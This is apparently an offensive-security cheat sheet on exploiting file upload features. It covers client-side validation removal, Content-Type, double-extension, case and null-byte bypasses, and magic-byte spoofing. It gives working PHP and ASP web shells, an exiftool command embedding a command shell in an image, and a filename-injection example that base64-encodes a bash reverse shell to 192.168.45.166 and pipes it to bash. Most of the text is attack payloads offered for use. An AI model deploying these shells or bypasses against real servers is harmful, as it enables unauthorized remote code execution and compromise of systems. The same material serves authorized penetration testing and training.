# Upload Vulnerabilities

## Prerequisite:

### Find an upload page using directory bruteforce (gobuster), or you may find it on an admin dashboard of a CMS application.

## Disable Frontend Validation

1. Use the Browser Inspector to find the function that validates the file, delete it and then upload the file, keep in mind that this will not work if the validation is at server-level.

2. Use BurpSuite and send a normal request, intercept it and then modify it to our malicious form and then send it.

## Overwriting existing files:

### Simply put, rename your payload to the same name of the file you want to overwrite then upload.

## Content-Type Bypass

Upon launching your file, open BurpSuite and change the Content-Type header to something the server accepts.

For example, when uploading a .php shell and the server accepts .png files, you can change the header from:

    application/x-php
    
to

    image/png

Then simply forward the request for the file to be uploaded.


## Double Extension

If the server accepts for example only .png files, but does not validate the content properly, simply add a second valid extension in front of your reverse shell file.

For example, from

    shell.php

to

    shell.php.png

Upload the file to get your shell.

## Image size validation bypass

If the file you want to upload exceeds the file size e.g. 1kb, it won't be accepted by the server.

Hence, we can use a way smaller file like the simple-backdoor.php

    cp /usr/share/webshells/php/simple-backdoor.php /root/Desktop/

After uploading, access you shell to example URL where file uploads migth be located:

    http://domain.local/uploads/simple-backdoor.php?cmd=id

## Blacklisted Extenstion file upload

Wordlist to fuzz with ffuf or Burpsuite (no URL encode)

    /usr/share/seclists/Discovery/Web-Content/web-extensions.txt

Some applications might blacklist extensions like .php for example.

To bypass this you can just rename the extension by manipulating the cases.

For example:

    shell.PHP
    shell.pHp
    shell.phP

But before getting your shell, we might need to upload an .htaccess file with the content:

    AddType application/x-httpd-php PHP

Save the file, then upload it to the server. After that, try to reupload your file.

Upload the file to get your shell if bypassed successfully.

## Magic Bytes Bypass (MIME Type Spoofing)

If an upload functionality permits only for example, image files, we can append some "Magic Bytes" on our reverse shell to make it an image file.

    GIF87a
    <?php
    
    if(isset($_REQUEST['cmd'])){
            echo "<pre>";
            $cmd = ($_REQUEST['cmd']);
            system($cmd);
            echo "</pre>";
            die;
    }
    
    ?>

Then verify with 

    file shell.php

## Character Injection

Try using null byte injection to bypass filters, e.g., shell.php%00.jpg; or inject characters before or after the final extension: 

For example shell.php%00.jpg works with PHP servers with version 5.X or earlier, as it causes the PHP web server to end the file name after the '%00', and store it as 'shell.php'.

    %20
    %0a
    %00
    %0d0a
    /
    .\
    .
    …
    :


Script for all permutations

    for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
        for ext in '.php' '.php2' '.php3' '.php4' '.php5' '.php6' '.php7' '.phps' '.pht' '.phtm' '.phtml' '.pgif' '.phar' '.hphp'; do
            echo "shell$char$ext.jpg" >> wordlist.txt
            echo "shell$ext$char.jpg" >> wordlist.txt
            echo "shell.jpg$char$ext" >> wordlist.txt
            echo "shell.jpg$ext$char" >> wordlist.txt
        done
    done

## Embed Code into images

    exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg

    mv lo.jpg lo.php.jpg

## Embed Code into filenames

A common file upload attack uses a malicious string for the uploaded file name, which may get executed or processed if the uploaded file name is displayed on the page, or directly executed in the server.

For example, if we name a file file$(whoami).jpg or filewhoami.jpg or file.jpg||whoami, and then the web application attempts to move the uploaded file with an OS command (e.g. mv file /tmp), then our file name would inject the whoami command, which would get executed, leading to remote code execution. 

Example:

    echo "bash -i >& /dev/tcp/192.168.45.166/444 0>&1" | base64

Download any normal image, and give it the name: cat.jpg

    cp cat.jpg '|smile"'echo <base64_bash_reverse_shell> | base64 -d | bash'".jpg'

## Web Shells

| **Web Shell**   | **Description**   |
| --------------|-------------------|
| `<?php file_get_contents('/etc/passwd'); ?>` | Basic PHP File Read |
| `<?php system('hostname'); ?>` | Basic PHP Command Execution |
| `<?php system($_REQUEST['cmd']); ?>` | Basic PHP Web Shell |
| `<% eval request('cmd') %>` | Basic ASP Web Shell |
| `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php` | Generate PHP reverse shell |
| [PHP Web Shell](https://github.com/Arrexel/phpbash) | PHP Web Shell |
| [PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell) | PHP Reverse Shell |
| [Web/Reverse Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) | List of Web Shells and Reverse Shells |

## Bypasses

| **Command**   | **Description**   |
| --------------|-------------------|
| **Client-Side Bypass** |
| `[CTRL+SHIFT+C]` | Toggle Page Inspector |
| **Blacklist Bypass** |
| `shell.phtml` | Uncommon Extension |
| `shell.pHp` | Case Manipulation |
| [PHP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) | List of PHP Extensions |
| [ASP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP) | List of ASP Extensions |
| [Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt) | List of Web Extensions |
| **Whitelist Bypass** |
| `shell.jpg.php` | Double Extension |
| `shell.php.jpg` | Reverse Double Extension |
| `%20`, `%0a`, `%00`, `%0d0a`, `/`, `.\`, `.`, `…` | Character Injection - Before/After Extension |
| **Content/Type Bypass** |
| [Web Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt) | List of Web Content-Types |
| [Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt) | List of All Content-Types |
| [File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) | List of File Signatures/Magic Bytes |

## Limited Uploads

| **Potential Attack**   | **File Types** |
| --------------|-------------------|
| `XSS` | HTML, JS, SVG, GIF |
| `XXE`/`SSRF` | XML, SVG, PDF, PPT, DOC |
| `DoS` | ZIP, JPG, PNG |
